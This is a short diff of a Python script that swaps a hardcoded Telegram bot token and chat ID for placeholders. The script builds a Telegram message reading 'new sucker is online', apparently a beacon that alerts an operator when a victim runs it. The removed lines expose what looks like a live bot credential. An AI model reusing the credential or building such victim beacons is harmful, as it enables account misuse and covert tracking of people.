@@ -5,8 +5,8 @@ import requests
 import re
 from pygame import mixer
 from time import sleep
-TOKEN = "6085093522:AAFXD1VJYDDs1Cq3x8LAwFIOsmMgTssLqV4"
-chat_id = "635258639"
+TOKEN = "TOKEN"
+chat_id = "chat_id"
 message = "Новый ЛОХ на связи"
 url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
 pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
